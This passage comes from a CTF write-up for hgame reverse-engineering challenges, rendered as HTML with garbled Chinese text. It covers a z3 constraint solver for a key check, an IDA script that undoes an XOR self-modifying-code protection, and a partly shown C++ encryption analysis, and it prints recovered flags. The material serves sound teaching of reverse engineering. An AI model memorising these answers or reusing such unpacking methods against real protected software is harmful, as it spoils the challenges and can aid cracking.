class="number">0x12BB</span>) + num[<span class="number">10</span>] - <span class="number">25636</span> + num[<span class="number">11</span>] - <span class="number">16780</span> + num[<span class="number">12</span>] - <span class="number">62345</span> == <span class="number">14020739</span> &amp;&amp; num[<span class="number">0</span>] - <span class="number">10968</span> + num[<span class="number">1</span>] - <span class="number">31780</span> + (num[<span class="number">2</span>] ^ <span class="number">0x7C71</span>) + num[<span class="number">3</span>] - <span class="number">61983</span> + num[<span class="number">4</span>] * <span class="number">31048</span> + num[<span class="number">5</span>] * <span class="number">20189</span> + num[<span class="number">6</span>] + <span class="number">12337</span> + num[<span class="number">7</span>] * <span class="number">25945</span> + (num[<span class="number">8</span>] ^ <span class="number">0x1B98</span>) + num[<span class="number">9</span>] - <span class="number">25369</span> + num[<span class="number">10</span>] - <span class="number">54893</span> + num[<span class="number">11</span>] * <span class="number">59949</span> + (num[<span class="number">12</span>] ^ <span class="number">0x3099</span>) == <span class="number">14434062</span> &amp;&amp; num[<span class="number">0</span>] + <span class="number">16689</span> + num[<span class="number">1</span>] - <span class="number">10279</span> + num[<span class="number">2</span>] - <span class="number">32918</span> + num[<span class="number">3</span>] - <span class="number">57155</span> + num[<span class="number">4</span>] * <span class="number">26571</span> + num[<span class="number">5</span>] * <span class="number">15086</span> + (num[<span class="number">6</span>] ^ <span class="number">0x59CA</span>) + (num[<span class="number">7</span>] ^ <span class="number">0x5B35</span>) + (num[<span class="number">8</span>] ^ <span class="number">0x3FFD</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x5A85</span>) + num[<span class="number">10</span>] - <span class="number">40224</span> + num[<span class="number">11</span>] + <span class="number">31751</span> + num[<span class="number">12</span>] * <span class="number">8421</span> == <span class="number">7433598</span> &amp;&amp; num[<span class="number">0</span>] + <span class="number">28740</span> + num[<span class="number">1</span>] - <span class="number">64696</span> + num[<span class="number">2</span>] + <span class="number">60470</span> + num[<span class="number">3</span>] - <span class="number">14752</span> + (num[<span class="number">4</span>] ^ <span class="number">0x507</span>) + (num[<span class="number">5</span>] ^ <span class="number">0x89C8</span>) + num[<span class="number">6</span>] + <span class="number">49467</span> + num[<span class="number">7</span>] - <span class="number">33788</span> + num[<span class="number">8</span>] + <span class="number">20606</span> + (num[<span class="number">9</span>] ^ <span class="number">0xAF4A</span>) + num[<span class="number">10</span>] * <span class="number">19764</span> + num[<span class="number">11</span>] + <span class="number">48342</span> + num[<span class="number">12</span>] * <span class="number">56511</span> == <span class="number">7989404</span> &amp;&amp; (num[<span class="number">0</span>] ^ <span class="number">0x7132</span>) + num[<span class="number">1</span>] + <span class="number">23120</span> + num[<span class="number">2</span>] + <span class="number">22802</span> + num[<span class="number">3</span>] * <span class="number">31533</span> + (num[<span class="number">4</span>] ^ <span class="number">0x9977</span>) + num[<span class="number">5</span>] - <span class="number">48576</span> + (num[<span class="number">6</span>] ^ <span class="number">0x6F7E</span>) + num[<span class="number">7</span>] - <span class="number">43265</span> + num[<span class="number">8</span>] + <span class="number">22365</span> + num[<span class="number">9</span>] + <span class="number">61108</span> + num[<span class="number">10</span>] * <span class="number">2823</span> + num[<span class="number">11</span>] - <span class="number">30343</span> + num[<span class="number">12</span>] + <span class="number">14780</span> == <span class="number">3504803</span> &amp;&amp; num[<span class="number">0</span>] * <span class="number">22466</span> + (num[<span class="number">1</span>] ^ <span class="number">0xDABF</span>) + num[<span class="number">2</span>] - <span class="number">53658</span> + (num[<span class="number">3</span>] ^ <span class="number">0xB838</span>) + (num[<span class="number">4</span>] ^ <span class="number">0x30DF</span>) + num[<span class="number">5</span>] * <span class="number">59807</span> + num[<span class="number">6</span>] + <span class="number">46242</span> + num[<span class="number">7</span>] + <span class="number">3052</span> + (num[<span class="number">8</span>] ^ <span class="number">0x62BF</span>) + num[<span class="number">9</span>] + <span class="number">30202</span> + num[<span class="number">10</span>] * <span class="number">22698</span> + num[<span class="number">11</span>] + <span class="number">33480</span> + (num[<span class="number">12</span>] ^ <span class="number">0x4175</span>) == <span class="number">11003580</span> &amp;&amp; num[<span class="number">0</span>] * <span class="number">57492</span> + (num[<span class="number">1</span>] ^ <span class="number">0x346D</span>) + num[<span class="number">2</span>] - <span class="number">13941</span> + (num[<span class="number">3</span>] ^ <span class="number">0xBBDC</span>) + num[<span class="number">4</span>] * <span class="number">38310</span> + num[<span class="number">5</span>] + <span class="number">9884</span> + num[<span class="number">6</span>] - <span class="number">45500</span> + num[<span class="number">7</span>] - <span class="number">19233</span> + num[<span class="number">8</span>] + <span class="number">58274</span> + num[<span class="number">9</span>] + <span class="number">36175</span> + (num[<span class="number">10</span>] ^ <span class="number">0x4888</span>) + num[<span class="number">11</span>] * <span class="number">49694</span> + (num[<span class="number">12</span>] ^ <span class="number">0x2501</span>) == <span class="number">25546210</span> &amp;&amp; num[<span class="number">0</span>] - <span class="number">23355</span> + num[<span class="number">1</span>] * <span class="number">50164</span> + (num[<span class="number">2</span>] ^ <span class="number">0x873A</span>) + num[<span class="number">3</span>] + <span class="number">52703</span> + num[<span class="number">4</span>] + <span class="number">36245</span> + num[<span class="number">5</span>] * <span class="number">46648</span> + (num[<span class="number">6</span>] ^ <span class="number">0x12FA</span>) + (num[<span class="number">7</span>] ^ <span class="number">0xA376</span>) + num[<span class="number">8</span>] * <span class="number">27122</span> + (num[<span class="number">9</span>] ^ <span class="number">0xA44A</span>) + num[<span class="number">10</span>] * <span class="number">15676</span> + num[<span class="number">11</span>] - <span class="number">31863</span> + num[<span class="number">12</span>] + <span class="number">62510</span> == <span class="number">11333836</span> &amp;&amp; num[<span class="number">0</span>] * <span class="number">30523</span> + (num[<span class="number">1</span>] ^ <span class="number">0x1F36</span>) + num[<span class="number">2</span>] + <span class="number">39058</span> + num[<span class="number">3</span>] * <span class="number">57549</span> + (num[<span class="number">4</span>] ^ <span class="number">0xD0C0</span>) + num[<span class="number">5</span>] * <span class="number">4275</span> + num[<span class="number">6</span>] - <span class="number">48863</span> + (num[<span class="number">7</span>] ^ <span class="number">0xD88C</span>) + (num[<span class="number">8</span>] ^ <span class="number">0xA40</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x3554</span>) + num[<span class="number">10</span>] + <span class="number">62231</span> + num[<span class="number">11</span>] + <span class="number">19456</span> + num[<span class="number">12</span>] - <span class="number">13195</span> == <span class="number">13863722</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">int</span>[] array = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">47</span>]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">132</span>, <span class="number">47</span>, <span class="number">180</span>, <span class="number">7</span>, <span class="number">216</span>, <span class="number">45</span>, <span class="number">68</span>, <span class="number">6</span>, <span class="number">39</span>, <span class="number">246</span>,</span><br><span class="line"><span class="number">124</span>, <span class="number">2</span>, <span class="number">243</span>, <span class="number">137</span>, <span class="number">58</span>, <span class="number">172</span>, <span class="number">53</span>, <span class="number">200</span>, <span class="number">99</span>, <span class="number">91</span>,</span><br><span class="line"><span class="number">83</span>, <span class="number">13</span>, <span class="number">171</span>, <span class="number">80</span>, <span class="number">108</span>, <span class="number">235</span>, <span class="number">179</span>, <span class="number">58</span>, <span class="number">176</span>, <span class="number">28</span>,</span><br><span class="line"><span class="number">216</span>, <span class="number">36</span>, <span class="number">11</span>, <span class="number">80</span>, <span class="number">39</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">58</span>, <span class="number">236</span>, <span class="number">130</span>,</span><br><span class="line"><span class="number">123</span>, <span class="number">176</span>, <span class="number">24</span>, <span class="number">212</span>, <span class="number">56</span>, <span class="number">89</span>, <span class="number">72</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">string</span> text = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; array.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line">text += (<span class="built_in">char</span>)(array[i] ^ num[i % num.Length]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> SoundPlayer((Stream)Resources.è¿‡å¹´é¸¡).Play();</span><br><span class="line">MessageBox.Show(text);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æå–åˆ¤æ–­æ¡ä»¶ï¼Œç”¨z3æ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">132</span>, <span class="number">47</span>, <span class="number">180</span>, <span class="number">7</span>, <span class="number">216</span>, <span class="number">45</span>, <span class="number">68</span>, <span class="number">6</span>, <span class="number">39</span>, <span class="number">246</span>, <span class="number">124</span>, <span class="number">2</span>, <span class="number">243</span>, <span class="number">137</span>, <span class="number">58</span>, <span class="number">172</span>, <span class="number">53</span>, <span class="number">200</span>, <span class="number">99</span>, <span class="number">91</span>, <span class="number">83</span>, <span class="number">13</span>, <span class="number">171</span>, <span class="number">80</span>, <span class="number">108</span>, <span class="number">235</span>, <span class="number">179</span>, <span class="number">58</span>, <span class="number">176</span>, <span class="number">28</span>, <span class="number">216</span>, <span class="number">36</span>, <span class="number">11</span>, <span class="number">80</span>, <span class="number">39</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">58</span>, <span class="number">236</span>, <span class="number">130</span>, <span class="number">123</span>, <span class="number">176</span>, <span class="number">24</span>, <span class="number">212</span>, <span class="number">56</span>, <span class="number">89</span>, <span class="number">72</span>]</span><br><span class="line"></span><br><span class="line">num = [BitVec(<span class="string">f&#x27;num<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(num[<span class="number">0</span>] + <span class="number">52296</span> + num[<span class="number">1</span>] - <span class="number">26211</span> + num[<span class="number">2</span>] - <span class="number">11754</span> + (num[<span class="number">3</span>] ^ <span class="number">0xA114</span>) + num[<span class="number">4</span>] * <span class="number">63747</span> + num[<span class="number">5</span>] - <span class="number">52714</span> + num[<span class="number">6</span>] - <span class="number">10512</span> + num[<span class="number">7</span>] * <span class="number">12972</span> + num[<span class="number">8</span>] + <span class="number">45505</span> + num[<span class="number">9</span>] - <span class="number">21713</span> + num[<span class="number">10</span>] - <span class="number">59122</span> + num[<span class="number">11</span>] - <span class="number">12840</span> + (num[<span class="number">12</span>] ^ <span class="number">0x525F</span>) == <span class="number">12702282</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] - <span class="number">25228</span> + (num[<span class="number">1</span>] ^ <span class="number">0x50DB</span>) + (num[<span class="number">2</span>] ^ <span class="number">0x1FDE</span>) + num[<span class="number">3</span>] - <span class="number">65307</span> + num[<span class="number">4</span>] * <span class="number">30701</span> + num[<span class="number">5</span>] * <span class="number">47555</span> + num[<span class="number">6</span>] - <span class="number">2557</span> + (num[<span class="number">7</span>] ^ <span class="number">0xBF9F</span>) + num[<span class="number">8</span>] - <span class="number">7992</span> + (num[<span class="number">9</span>] ^ <span class="number">0xE079</span>) + (num[<span class="number">10</span>] ^ <span class="number">0xE052</span>) + num[<span class="number">11</span>] + <span class="number">13299</span> + num[<span class="number">12</span>] - <span class="number">50966</span> == <span class="number">9946829</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] - <span class="number">64801</span> + num[<span class="number">1</span>] - <span class="number">60698</span> + num[<span class="number">2</span>] - <span class="number">40853</span> + num[<span class="number">3</span>] - <span class="number">54907</span> + num[<span class="number">4</span>] + <span class="number">29882</span> + (num[<span class="number">5</span>] ^ <span class="number">0x3506</span>) + (num[<span class="number">6</span>] ^ <span class="number">0x533E</span>) + num[<span class="number">7</span>] + <span class="number">47366</span> + num[<span class="number">8</span>] + <span class="number">41784</span> + (num[<span class="number">9</span>] ^ <span class="number">0xD1BA</span>) + num[<span class="number">10</span>] * <span class="number">58436</span> + num[<span class="number">11</span>] * <span class="number">15590</span> + num[<span class="number">12</span>] + <span class="number">58225</span> == <span class="number">2372055</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] + <span class="number">61538</span> + num[<span class="number">1</span>] - <span class="number">17121</span> + num[<span class="number">2</span>] - <span class="number">58124</span> + num[<span class="number">3</span>] + <span class="number">8186</span> + num[<span class="number">4</span>] + <span class="number">21253</span> + num[<span class="number">5</span>] - <span class="number">38524</span> + num[<span class="number">6</span>] - <span class="number">48323</span> + num[<span class="number">7</span>] - <span class="number">20556</span> + num[<span class="number">8</span>] * <span class="number">56056</span> + num[<span class="number">9</span>] + <span class="number">18568</span> + num[<span class="number">10</span>] + <span class="number">12995</span> + (num[<span class="number">11</span>] ^ <span class="number">0x995C</span>) + num[<span class="number">12</span>] + <span class="number">25329</span> == <span class="number">6732474</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] - <span class="number">42567</span> + num[<span class="number">1</span>] - <span class="number">17743</span> + num[<span class="number">2</span>] * <span class="number">47827</span> + num[<span class="number">3</span>] - <span class="number">10246</span> + (num[<span class="number">4</span>] ^ <span class="number">0x3F9C</span>) + num[<span class="number">5</span>] + <span class="number">39390</span> + num[<span class="number">6</span>] * <span class="number">11803</span> + num[<span class="number">7</span>] * <span class="number">60332</span> + (num[<span class="number">8</span>] ^ <span class="number">0x483B</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x12BB</span>) + num[<span class="number">10</span>] - <span class="number">25636</span> + num[<span class="number">11</span>] - <span class="number">16780</span> + num[<span class="number">12</span>] - <span class="number">62345</span> == <span class="number">14020739</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] - <span class="number">10968</span> + num[<span class="number">1</span>] - <span class="number">31780</span> + (num[<span class="number">2</span>] ^ <span class="number">0x7C71</span>) + num[<span class="number">3</span>] - <span class="number">61983</span> + num[<span class="number">4</span>] * <span class="number">31048</span> + num[<span class="number">5</span>] * <span class="number">20189</span> + num[<span class="number">6</span>] + <span class="number">12337</span> + num[<span class="number">7</span>] * <span class="number">25945</span> + (num[<span class="number">8</span>] ^ <span class="number">0x1B98</span>) + num[<span class="number">9</span>] - <span class="number">25369</span> + num[<span class="number">10</span>] - <span class="number">54893</span> + num[<span class="number">11</span>] * <span class="number">59949</span> + (num[<span class="number">12</span>] ^ <span class="number">0x3099</span>) == <span class="number">14434062</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] + <span class="number">16689</span> + num[<span class="number">1</span>] - <span class="number">10279</span> + num[<span class="number">2</span>] - <span class="number">32918</span> + num[<span class="number">3</span>] - <span class="number">57155</span> + num[<span class="number">4</span>] * <span class="number">26571</span> + num[<span class="number">5</span>] * <span class="number">15086</span> + (num[<span class="number">6</span>] ^ <span class="number">0x59CA</span>) + (num[<span class="number">7</span>] ^ <span class="number">0x5B35</span>) + (num[<span class="number">8</span>] ^ <span class="number">0x3FFD</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x5A85</span>) + num[<span class="number">10</span>] - <span class="number">40224</span> + num[<span class="number">11</span>] + <span class="number">31751</span> + num[<span class="number">12</span>] * <span class="number">8421</span> == <span class="number">7433598</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] + <span class="number">28740</span> + num[<span class="number">1</span>] - <span class="number">64696</span> + num[<span class="number">2</span>] + <span class="number">60470</span> + num[<span class="number">3</span>] - <span class="number">14752</span> + (num[<span class="number">4</span>] ^ <span class="number">0x507</span>) + (num[<span class="number">5</span>] ^ <span class="number">0x89C8</span>) + num[<span class="number">6</span>] + <span class="number">49467</span> + num[<span class="number">7</span>] - <span class="number">33788</span> + num[<span class="number">8</span>] + <span class="number">20606</span> + (num[<span class="number">9</span>] ^ <span class="number">0xAF4A</span>) + num[<span class="number">10</span>] * <span class="number">19764</span> + num[<span class="number">11</span>] + <span class="number">48342</span> + num[<span class="number">12</span>] * <span class="number">56511</span> == <span class="number">7989404</span> )</span><br><span class="line">s.add( (num[<span class="number">0</span>] ^ <span class="number">0x7132</span>) + num[<span class="number">1</span>] + <span class="number">23120</span> + num[<span class="number">2</span>] + <span class="number">22802</span> + num[<span class="number">3</span>] * <span class="number">31533</span> + (num[<span class="number">4</span>] ^ <span class="number">0x9977</span>) + num[<span class="number">5</span>] - <span class="number">48576</span> + (num[<span class="number">6</span>] ^ <span class="number">0x6F7E</span>) + num[<span class="number">7</span>] - <span class="number">43265</span> + num[<span class="number">8</span>] + <span class="number">22365</span> + num[<span class="number">9</span>] + <span class="number">61108</span> + num[<span class="number">10</span>] * <span class="number">2823</span> + num[<span class="number">11</span>] - <span class="number">30343</span> + num[<span class="number">12</span>] + <span class="number">14780</span> == <span class="number">3504803</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] * <span class="number">22466</span> + (num[<span class="number">1</span>] ^ <span class="number">0xDABF</span>) + num[<span class="number">2</span>] - <span class="number">53658</span> + (num[<span class="number">3</span>] ^ <span class="number">0xB838</span>) + (num[<span class="number">4</span>] ^ <span class="number">0x30DF</span>) + num[<span class="number">5</span>] * <span class="number">59807</span> + num[<span class="number">6</span>] + <span class="number">46242</span> + num[<span class="number">7</span>] + <span class="number">3052</span> + (num[<span class="number">8</span>] ^ <span class="number">0x62BF</span>) + num[<span class="number">9</span>] + <span class="number">30202</span> + num[<span class="number">10</span>] * <span class="number">22698</span> + num[<span class="number">11</span>] + <span class="number">33480</span> + (num[<span class="number">12</span>] ^ <span class="number">0x4175</span>) == <span class="number">11003580</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] * <span class="number">57492</span> + (num[<span class="number">1</span>] ^ <span class="number">0x346D</span>) + num[<span class="number">2</span>] - <span class="number">13941</span> + (num[<span class="number">3</span>] ^ <span class="number">0xBBDC</span>) + num[<span class="number">4</span>] * <span class="number">38310</span> + num[<span class="number">5</span>] + <span class="number">9884</span> + num[<span class="number">6</span>] - <span class="number">45500</span> + num[<span class="number">7</span>] - <span class="number">19233</span> + num[<span class="number">8</span>] + <span class="number">58274</span> + num[<span class="number">9</span>] + <span class="number">36175</span> + (num[<span class="number">10</span>] ^ <span class="number">0x4888</span>) + num[<span class="number">11</span>] * <span class="number">49694</span> + (num[<span class="number">12</span>] ^ <span class="number">0x2501</span>) == <span class="number">25546210</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] - <span class="number">23355</span> + num[<span class="number">1</span>] * <span class="number">50164</span> + (num[<span class="number">2</span>] ^ <span class="number">0x873A</span>) + num[<span class="number">3</span>] + <span class="number">52703</span> + num[<span class="number">4</span>] + <span class="number">36245</span> + num[<span class="number">5</span>] * <span class="number">46648</span> + (num[<span class="number">6</span>] ^ <span class="number">0x12FA</span>) + (num[<span class="number">7</span>] ^ <span class="number">0xA376</span>) + num[<span class="number">8</span>] * <span class="number">27122</span> + (num[<span class="number">9</span>] ^ <span class="number">0xA44A</span>) + num[<span class="number">10</span>] * <span class="number">15676</span> + num[<span class="number">11</span>] - <span class="number">31863</span> + num[<span class="number">12</span>] + <span class="number">62510</span> == <span class="number">11333836</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] * <span class="number">30523</span> + (num[<span class="number">1</span>] ^ <span class="number">0x1F36</span>) + num[<span class="number">2</span>] + <span class="number">39058</span> + num[<span class="number">3</span>] * <span class="number">57549</span> + (num[<span class="number">4</span>] ^ <span class="number">0xD0C0</span>) + num[<span class="number">5</span>] * <span class="number">4275</span> + num[<span class="number">6</span>] - <span class="number">48863</span> + (num[<span class="number">7</span>] ^ <span class="number">0xD88C</span>) + (num[<span class="number">8</span>] ^ <span class="number">0xA40</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x3554</span>) + num[<span class="number">10</span>] + <span class="number">62231</span> + num[<span class="number">11</span>] + <span class="number">19456</span> + num[<span class="number">12</span>] - <span class="number">13195</span> == <span class="number">13863722</span>)</span><br><span class="line"></span><br><span class="line">s.add(num[<span class="number">0</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;h&#x27;</span>)^c[<span class="number">0</span>])</span><br><span class="line">s.add(num[<span class="number">1</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;g&#x27;</span>)^c[<span class="number">1</span>])</span><br><span class="line">s.add(num[<span class="number">2</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)^c[<span class="number">2</span>])</span><br><span class="line">s.add(num[<span class="number">3</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>)^c[<span class="number">3</span>])</span><br><span class="line">s.add(num[<span class="number">4</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;e&#x27;</span>)^c[<span class="number">4</span>])</span><br><span class="line">s.add(num[<span class="number">5</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;&#123;&#x27;</span>)^c[<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    key.append(m[num[i]].as_long())</span><br><span class="line"></span><br><span class="line">flag = [(c[i]^key[i%<span class="number">13</span>])%<span class="number">128</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;z3_1s_very_u5eful_1n_rever5e_engin3ering&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="patchme"><a href="#patchme" class="headerlink" title="patchme"></a>patchme</h3><blockquote><p>ä¸ä¼špwnçš„reæ‰‹ä¸æ˜¯ä¸€ä¸ªå¥½CTFerï¼æ¸¸æˆè§„åˆ™ï¼šä¿®å¤ç¨‹åºä¸­çš„äºŒè¿›åˆ¶å®‰å…¨æ¼æ´ï¼Œè¦æ±‚èƒ½ä¸¥æ ¼æ‰§è¡ŒåŸç¨‹åºçš„æ­£å¸¸åŠŸèƒ½ä¸”ä¸å˜åŠ¨æ–‡ä»¶å¤§å°ï¼Œå¦‚æœä¿®å¤æˆåŠŸï¼Œåœ¨è¿è¡Œåè¾“å…¥ä»»ä½•å†…å®¹å³å¯è¾“å‡ºflagã€‚é™„ä»¶æ›´æ–°ï¼Œå¢åŠ éƒ¨åˆ†æºç ä»¥ä½œæç¤ºï¼š<a href="https://share.weiyun.com/Kj85naWl">https://share.weiyun.com/Kj85naWl</a></p></blockquote><p>åœ¨ <code>init()</code> ä¸­è°ƒç”¨ <code>sub_1887()</code>ï¼Œè€Œ <code>sub_1887()</code> é‡Œå¯¹ <code>loc_14C6</code> åŒºåŸŸçš„æ•°æ®è¿›è¡Œå¼‚æˆ– <code>0x66</code> æ“ä½œï¼Œç±»ä¼¼äºSMCåè°ƒè¯•ï¼Œç”¨IDAä»£ç è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static main()</span><br><span class="line">&#123;</span><br><span class="line">    auto addr = <span class="number">0x0014c6</span>;</span><br><span class="line">    auto i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">960</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PatchByte(addr+i,Byte(addr+i)^<span class="number">0x66</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>0x14CA</code> å¤„æŒ‰Pè¯†åˆ«ä¸ºå‡½æ•° <code>sub_14CA()</code>ï¼Œçœ‹åˆ°ä¸»è¦é€»è¾‘ä¸ºå­—ç¬¦ä¸¤ä¸¤å¼‚æˆ–æ“ä½œï¼Œè¿˜åŸå³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">s</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">        res += <span class="built_in">list</span>(long_to_bytes(k)[::-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">x = [<span class="number">0x5416D999808A28FA</span>,<span class="number">0x588505094953B563</span>,<span class="number">0xCE8CF3A0DC669097</span>,<span class="number">0x4C5CF3E854F44CBD</span>,<span class="number">0xD144E49916678331</span>,<span class="number">0xDA616BAC</span>,<span class="number">0xBBD0</span>,<span class="number">0x55</span>]</span><br><span class="line">y = [<span class="number">0x3B4FA2FCEDEB4F92</span>,<span class="number">0x7E45A6C3B67EA16</span>,<span class="number">0xAFE1ACC8BF12D0E7</span>,<span class="number">0x132EC3B7269138CE</span>,<span class="number">0x8E2197EB7311E643</span>,<span class="number">0xAE540AC1</span>,<span class="number">0xC9B5</span>,<span class="number">0x28</span>]</span><br><span class="line"></span><br><span class="line">x = change(x)</span><br><span class="line">y = change(y)</span><br><span class="line"></span><br><span class="line">flag = [x[i]^y[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;You_4re_a_p@tch_master_0r_reverse_ma5ter&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h3><blockquote><p>C++æ˜¯ä¸€é—¨éå¸¸å¥½çš„è¯­è¨€ï¼Œä»–å¥½å°±å¥½åœ¨äº†é€†å‘æ¯”è¾ƒéš¾ğŸ˜œ</p></blockquote><p>å»äº†ç¬¦å·ï¼ŒIDAåˆ†æä¼ªç å¾ˆéš¾çœ‹ï¼Œåˆ†æä¸»è¦åŠ å¯†é€»è¾‘åœ¨ <code>sub_1400026A0()</code>ï¼Œvftableä¸­åˆ†åˆ«æœ‰ <code>encrypt1</code> å’Œ <code>encrypt2</code>ï¼Œå¯¹åº”çš„å‡½æ•°è¡¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">encrypt1</span><br><span class="line">sub_140001600 0</span><br><span class="line"></span><br><span class="line">encrypt2</span><br><span class="line">sub_140002E60 0</span><br><span class="line">sub_140001710 8</span><br><span class="line">sub_140001E30 16</span><br><span class="line">sub_1400022F0 24</span><br><span class="line">sub_1400027A0 32</span><br><span class="line">sub_140002B90 40</span><br><span class="line">sub_140003080 48</span><br></pre></td></tr></table></figure><p><code>encrypt1</code> ä¸­ <code>sub_140001600()</code> ä¸ºå¼‚æˆ–æ“ä½œï¼Œ<code>encrypt2</code> ä¸­ä¸€ç³»åˆ—æ“ä½œä¸ºåŠ å¯†è¿ç®—+æœ€åæ¯”å¯¹å¯†æ–‡ã€‚</p><p>è¾“å…¥æµ‹è¯•æ•°æ®ï¼Œåœ¨æœ€åçš„å¯†æ–‡æ¯”å¯¹å‡½æ•° <code>sub_140003080()</code> ä¸‹æ–­ç‚¹ï¼ŒåŠ¨è°ƒæå–å‡ºæµ‹è¯•æ•°æ®å¯¹åº”çš„åŠ å¯†ç»“æœä»¥åŠå¼‚æˆ–æ“ä½œçš„keyå€¼ï¼Œæ ¹æ®keyå€¼å’Œæ˜å¯†æ–‡æ¥ç¡®å®šå¼‚æˆ–è®¡ç®—é€»è¾‘ä¸ºï¼Œæ¯4ä½å¯†æ–‡åå‘å¼‚æˆ–æ¯4ä½keyå€¼ã€‚</p><p>æœ€åç”¨å®é™…å¯†æ–‡ä¸keyå¼‚æˆ–æ“ä½œè¿˜åŸæ˜æ–‡ï¼š</p><figure class="highlight 